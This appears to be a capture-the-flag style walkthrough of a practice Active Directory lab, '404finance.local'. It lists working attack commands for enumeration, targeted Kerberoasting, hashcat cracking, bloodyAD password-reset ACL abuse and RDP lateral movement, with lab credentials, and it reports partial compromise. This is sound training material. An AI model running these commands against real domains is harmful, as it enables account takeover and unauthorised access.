404finance AD Lab Walkthrough

Target
- Domain: 404finance.local
- DC: 10.1.24.29

Initial Access
- Downloaded CorpBankDialer.exe from the internal website
- Extracted debug value from the binary
- Decoded base64 to MD5 hash
- Cracked hash with john/hashcat
- Recovered password: Password123!!

Valid Credentials
- karl.hackermann : Password123!!

Enumeration
rpcclient -U '404finance.local\karl.hackermann%Password123!!' 10.1.24.29
crackmapexec smb 10.1.24.29 -u karl.hackermann -p 'Password123!!' --users
ldapsearch -x -H ldap://10.1.24.29 -D 'karl.hackermann@404finance.local' -w 'Password123!!' -b 'DC=404finance,DC=local' '(objectClass=user)' sAMAccountName description

Targeted Kerberoasting
python3 targetedKerberoast.py -d '404finance.local' -u 'karl.hackermann' -p 'Password123!!' --dc-ip 10.1.24.29

Recovered TGS Hash
- tom.reboot

Password Crack
hashcat -a 0 -m 13100 tom.hash /usr/share/wordlists/rockyou.txt
- tom.reboot : P@ssw0rd123

ACL Abuse / Password Reset Chain
bloodyAD --host 10.1.24.29 -d 404finance.local -u 'tom.reboot' -p 'P@ssw0rd123' set password 'robert.graef' 'Winter2026!'
bloodyAD --host 10.1.24.29 -d 404finance.local -u 'robert.graef' -p 'Winter2026!' set password 'jan.tresor' 'Winter2026!'
bloodyAD --host 10.1.24.29 -d 404finance.local -u 'robert.graef' -p 'Winter2026!' add groupMember 'Remote Desktop Users' 'jan.tresor'

Lateral Movement
xfreerdp3 /u:jan.tresor /d:404finance.local /p:'Winter2026!' /v:10.1.24.29 /cert:ignore

What Worked
- Initial credential extraction from internal binary
- SMB/LDAP/RPC enumeration
- Targeted Kerberoasting
- Hash cracking
- ACL abuse via password resets
- RDP access as jan.tresor

What Did Not Fully Work
- Final administrative escalation
- Root flag retrieval

Result
- Partial domain compromise achieved
- Medium-difficulty Active Directory privilege chain documented
